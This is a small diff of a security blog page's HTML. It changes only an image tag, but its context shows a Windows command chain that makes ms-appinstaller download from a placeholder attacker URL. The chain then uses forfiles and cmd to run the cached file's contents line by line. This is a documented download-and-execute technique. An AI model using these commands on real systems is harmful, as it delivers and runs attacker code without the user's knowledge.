@@ -249,7 +249,8 @@
 <pre><code class="hljs taggerscript">start ms-appinstaller://?source=&lt;hacker-url&gt; &amp;&amp; timeout &lt;sleep-time&gt; &amp;&amp; taskkill /F /IM AppInstaller.exe &gt; NUL
 
 forfiles /P &quot;C:<span class="hljs-symbol">\\</span>Users<span class="hljs-symbol">\\</span><span class="hljs-variable">%username%</span><span class="hljs-symbol">\\</span>AppData<span class="hljs-symbol">\\</span>Local<span class="hljs-symbol">\\</span>Packages<span class="hljs-symbol">\\</span>Microsoft.DesktopAppInstaller_8wekyb3d8bbwe<span class="hljs-symbol">\\</span>AC<span class="hljs-symbol">\\</span>INetCache&quot; /S /M * /C &quot;cmd /c if @fsize==&lt;file-size&gt; FOR /F <span class="hljs-symbol">\\</span>&quot;tokens=*<span class="hljs-symbol">\\</span>&quot; <span class="hljs-variable">%g IN (&apos;type @path&apos;) do (%</span>g);&quot; &gt; NUL</code></pre>
-<p><img src="/2020/12/03/idioth/2020-12-03/image.png" srcset="/img/loading.gif" alt></p>
+
+<p><img src="/2020/12/03/idioth/2020-12-03/image.png" srcset="/img/loading.gif"></p>
 
             </div>
             <hr>
